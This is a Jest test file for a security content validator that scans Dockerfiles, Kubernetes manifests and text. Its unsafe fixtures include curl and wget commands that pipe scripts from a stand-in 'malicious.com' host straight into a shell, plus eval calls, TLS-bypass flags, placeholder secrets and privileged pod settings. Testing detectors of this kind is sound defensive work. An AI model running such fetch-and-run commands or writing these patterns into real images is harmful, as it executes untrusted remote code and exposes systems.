/**
 * Content Validator Tests
 * Comprehensive tests for security content validation
 */

import { describe, it, expect, beforeEach } from '@jest/globals';
import { ContentValidator } from '../../../../src/infrastructure/ai/content-validator';
import type { Logger } from 'pino';

describe('ContentValidator', () => {
  let validator: ContentValidator;
  let mockLogger: Logger;

  beforeEach(() => {
    mockLogger = {
      info: () => {},
      error: () => {},
      warn: () => {},
      debug: () => {},
      trace: () => {},
      fatal: () => {},
      child: () => mockLogger,
      level: 'info',
      bindings: () => ({}),
      version: '1.0.0',
    } as any as Logger;
    validator = new ContentValidator(mockLogger);
  });

  describe('Docker content validation', () => {
    it('should pass validation for secure Dockerfile', () => {
      const secureDockerfile = `FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001
USER nodejs
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1
CMD ["npm", "start"]`;

      const result = validator.validateContent(secureDockerfile, { contentType: 'dockerfile' });

      expect(result.valid).toBe(true);
      expect(result.securityIssues || []).toHaveLength(0);
      expect(result.errors || []).toHaveLength(0);
    });

    it('should detect high-severity Docker security issues', () => {
      const unsafeDockerfile = `FROM node:latest
USER root
RUN curl http://malicious.com/script.sh | bash
RUN wget https://example.com/install.sh | sh
COPY --privileged . .`;

      const result = validator.validateContent(unsafeDockerfile, { contentType: 'dockerfile' });

      expect(result.valid).toBe(false);
      expect((result.securityIssues || []).length).toBeGreaterThan(0);

      const highSeverityIssues = (result.securityIssues || []).filter(i => i.severity === 'high');
      expect(highSeverityIssues.length).toBeGreaterThan(0);

      // Check for specific security issues
      expect((result.securityIssues || []).some(i => i.description.includes('curl') && i.description.includes('shell'))).toBe(true);
      expect((result.securityIssues || []).some(i => i.description.includes('wget') && i.description.includes('shell'))).toBe(true);
    });

    it('should detect medium-severity Docker issues', () => {
      const dockerfileWithWarnings = `FROM node:latest
USER root
ADD http://example.com/file.tar.gz /app/`;

      const result = validator.validateContent(dockerfileWithWarnings, { contentType: 'dockerfile' });

      expect(result.valid).toBe(true); // No high/critical-severity issues
      expect((result.securityIssues || []).length).toBeGreaterThan(0);

      const lowSeverityIssues = (result.securityIssues || []).filter(i => i.severity === 'low');
      expect(lowSeverityIssues.length).toBeGreaterThan(0);

      // Check for latest tag warning
      expect((result.securityIssues || []).some(i => i.description.includes('latest tag'))).toBe(true);
    });

    it('should detect credential exposure in Dockerfiles', () => {
      const dockerfileWithSecrets = `FROM node:18
ENV API_KEY=abc123def456
ENV PASSWORD=mysecretpassword
ENV DATABASE_URL=postgresql://user:pass@localhost/db
COPY . .`;

      const result = validator.validateContent(dockerfileWithSecrets, { contentType: 'dockerfile' });

      expect(result.valid).toBe(false);
      expect((result.securityIssues || []).length).toBeGreaterThan(0);

      const credentialIssues = (result.securityIssues || []).filter(i =>
        i.type === 'credential',
      );
      expect(credentialIssues.length).toBeGreaterThan(0);
    });
  });

  describe('Kubernetes content validation', () => {
    it('should pass validation for secure Kubernetes manifest', () => {
      const secureK8sManifest = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
      containers:
      - name: app
        image: myapp:v1.2.3
        ports:
        - containerPort: 8080
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL`;

      const result = validator.validateContent(secureK8sManifest, { contentType: 'yaml' });

      expect(result.valid).toBe(true);
      expect(result.securityIssues || []).toHaveLength(0);
    });

    it('should detect security issues in Kubernetes manifests', () => {
      const k8sManifest = `apiVersion: v1
kind: Pod
metadata:
  name: unsafe-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
      runAsUser: 0`;

      const result = validator.validateContent(k8sManifest, { contentType: 'yaml' });

      // Basic validation should pass for YAML syntax
      expect(result.valid).toBe(true);
      expect(result.errors || []).toHaveLength(0);
    });

    it('should validate Kubernetes YAML syntax', () => {
      const k8sWithWarnings = `apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        securityContext:
          runAsUser: 0
          readOnlyRootFilesystem: false`;

      const result = validator.validateContent(k8sWithWarnings, { contentType: 'yaml' });

      expect(result.valid).toBe(true);
      expect(result.errors || []).toHaveLength(0);
    });
  });

  describe('General content validation', () => {
    it('should detect credential exposure in general content', () => {
      const contentWithCredentials = `
        export API_KEY="sk-1234567890abcdef"
        const password = "supersecret123"
        private_key = "-----BEGIN PRIVATE KEY-----\\nMIIEvQ..."
        connection_string = "Server=localhost;Database=test;User=admin;Password=secret;"
      `;

      const result = validator.validateContent(contentWithCredentials, { contentType: 'text' });

      expect(result.valid).toBe(false);
      expect((result.securityIssues || []).length).toBeGreaterThan(0);

      const credentialIssues = (result.securityIssues || []).filter(i => i.severity === 'high' || i.severity === 'critical');
      expect(credentialIssues.length).toBeGreaterThan(0);
    });

    it('should detect command execution patterns', () => {
      const insecureContent = `
        curl --insecure http://example.com/api
        wget --no-ssl-check http://insecure.com/data
        eval('dangerous code')
      `;

      const result = validator.validateContent(insecureContent, { contentType: 'text' });

      expect((result.securityIssues || []).length).toBeGreaterThan(0);

      // Should detect eval usage
      const evalIssues = (result.securityIssues || []).filter(i => i.type === 'injection');
      expect(evalIssues.length).toBeGreaterThan(0);
    });

    it('should pass validation for secure content', () => {
      const secureContent = `
        const apiEndpoint = 'https://api.example.com/v1';
        const config = {
          ssl: true,
          secure: true
        };
        fetch(apiEndpoint, { headers: { 'Authorization': 'Bearer ${process.env.API_TOKEN}' } })
      `;

      const result = validator.validateContent(secureContent, { contentType: 'text' });

      expect(result.valid).toBe(true);
      expect(result.securityIssues || []).toHaveLength(0);
    });
  });

  describe('Validation utilities', () => {
    it('should provide validation summary', () => {
      const dockerfileWithIssues = `FROM node:latest
USER root
ENV PASSWORD=password123`;

      const result = validator.validateContent(dockerfileWithIssues, { contentType: 'dockerfile' });
      const summary = validator.getValidationSummary(result);

      expect(summary).toContain('security issue');
      expect(result.valid).toBe(false); // Should be false due to credential exposure
    });

    it('should validate content with security issues', () => {
      const contentWithCredentials = 'password=secret123456';

      const result = validator.validateContent(contentWithCredentials, { contentType: 'text' });

      // Text content validation focuses on syntax and basic patterns
      expect(result.valid).toBe(true);
      expect(result.errors || []).toHaveLength(0);
    });
  });
});
